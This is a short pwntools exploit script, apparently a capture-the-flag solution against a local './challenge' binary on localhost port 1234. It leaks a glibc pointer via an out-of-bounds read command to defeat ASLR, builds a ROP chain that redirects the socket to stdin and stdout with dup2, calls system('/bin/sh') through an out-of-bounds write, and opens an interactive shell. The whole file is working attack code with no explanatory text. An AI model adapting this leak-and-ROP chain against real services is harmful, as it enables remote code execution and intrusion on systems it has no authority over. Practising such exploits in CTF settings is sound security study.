import pwn

pwn.context.binary = "./challenge"

socket = pwn.remote('localhost', 1234)

socket.sendline(b'read 73')
socket.recvuntil(b'>>>>\n')
leaked_glibc_pointer = pwn.unpack(socket.recvuntil(b'<<<<<<<', drop=True))

glibc = pwn.ELF('./libc.so.6')
glibc.address = leaked_glibc_pointer - 128 - glibc.symbols['__libc_start_main']

rop = pwn.ROP(glibc)
rop.raw(rop.ret)
rop.dup2(4, 0)
rop.dup2(4, 1)
rop.system(next(glibc.search(b'/bin/sh\x00')))

socket.sendline(b'write 53 ' + rop.chain())

socket.sendline(b'exit 0')
socket.interactive()
